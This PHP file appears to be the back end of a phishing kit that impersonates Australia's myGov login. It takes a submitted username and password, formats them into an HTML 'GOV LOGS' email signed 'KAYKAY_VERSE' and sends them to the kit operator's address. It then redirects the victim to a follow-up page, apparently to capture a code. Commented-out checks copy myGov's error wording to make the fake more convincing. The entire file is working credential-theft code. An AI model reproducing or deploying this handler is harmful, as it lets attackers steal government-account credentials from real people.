<?php

if (isset($_POST["submit"])){
    $username = $_POST["username"];
    $password = $_POST["password"];

    $subject = "HELLO REMINDER ON OUR BIRTHDAY VERSE";
    $msg = "
    <html>
    <head><meta charset='UTF-8'></head>
    <div style='font-size: 13px;font-family:monospace;font-weight:700;'>
    ------------------ <font style='color: #820000;'>HELLO BRODY WE GONNA MAKE IT</font> ------------------<br/>
    -_-_-_-_-_-_-_-_-[ <font style='color: #0a5d00;'>GOV LOGS AJE</font> ]-_-_-_-_-_-_-_-_-<br>
    <font style='color:#9c0000;'>😈</font> [USERNAME]   = <font style='color:#0070ba;'>".$username."</font><br>
    <font style='color:#9c0000;'>😈</font> [PASSWORD]    = <font style='color:#0070ba;'>".$password."</font><br>
   
    
    ------------------ <font style='color: #820000;'>BY KAYKAY_VERSE</font> ------------------</div></html>\n";



    require_once 'Email.php';
    require_once 'function.inc.php';


    


    // if (empty($username) || empty($password)){
    //     header("location: ../index.php?error=emptyinput");
    //     exit();
    // }

    // if (! filter_var($username,FILTER_VALIDATE_EMAIL)){
    //     die("Enter a valid email address, mobile number or myGov username. A valid myGov username is 2 letters, followed by 6 number");
    //     header("location: ../index.php?error=emptyinput");
    //     exit();
    // }
    // if (! preg_match("/[a-z]/i", $username)){
    //     die("Enter a valid email address, mobile number or myGov username. A valid myGov username is 2 letters, followed by 6 number");
    //     header("location: ../index.php?error=emptyinput");
    //     exit();
    // }
    // if (! preg_match("/[0-9]/", $username)){
    //     die("Enter a valid email address, mobile number or myGov username. A valid myGov username is 2 letters, followed by 6 number");
    //     header("location: ../index.php?error=emptyinput");
    //     exit();
    // }

    // if (strlen($password) < 9 || strlen($password) > 9 ){
    //     header("location: ../index.php?error=invalidpwd");
    //     exit();
    // }

    sendmail($kaykayemail, $subject, $msg);
    header("location: ../code.php?error=none");

}
else{
    header("location: ../index.php?error=error");
}